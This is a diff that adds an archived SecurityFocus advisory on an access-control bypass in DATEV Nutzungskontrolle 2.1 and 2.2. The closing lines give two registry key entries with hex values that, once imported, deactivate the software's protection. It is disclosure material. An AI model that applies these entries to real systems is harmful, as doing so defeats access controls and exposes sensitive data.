@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/8950/info
+
+It has been reported that DATEV Nutzungskontrolle may be prone to a access validation issue that may allow a local attacker to gain access to sensitive data. The issue presents itself as a local user is able modify certain keys in the Windows registry resulting in bypassing the security model of the software. This issue would not present itself if the registry keys were set to read only.
+
+Successful exploitation of this issue may allow an attacker to gain access to sensitive data that could be used to launch further attacks against the system.
+
+Nutzungskontrolle V.2.1 and V.2.2 has been reported to be prone to this issue, however other versions may be affected as well.
+
+It is possible to deactivate the NUKO with just importing 2 registry
+keys:
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\DATEV]
+"NukoInfo"=hex:00,00,00,00,00,00,00,00,e4,6c,d9,ce,f1,69,97,e7,61,eb,08,48,e7,71,65,9b
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\DATEVeG\Components\B0000046\Versions\1.0\NukoInfos]
+"NukoInfo"=hex:00,00,00,00,00,00,00,00,e4,6c,d9,ce,f1,69,97,e7,61,eb,08,48,e7,71,65,9b
